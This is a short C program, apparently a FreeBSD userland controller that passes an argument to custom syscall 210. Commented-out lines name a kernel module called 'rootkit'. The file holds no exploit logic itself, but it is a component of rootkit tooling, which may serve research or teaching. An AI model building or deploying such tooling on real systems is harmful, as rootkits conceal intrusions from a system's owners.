#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/module.h>
#include <sys/param.h>

#define SYSCALL_NUM 210

int main(int argc, char *argv[]) {
	if (argc < 2) {
		//printf("Usage:\n%s <option>\n", argv[0]);
		exit(0);	
	}
	
	//printf("Syscall num: %d\n", modfind("rootkit"));
	if (syscall(SYSCALL_NUM, argv[1]) == -1) {
		//printf("System call failed, check if kernel module is loaded\n");
		return -1;	
	}
	return 0;
}
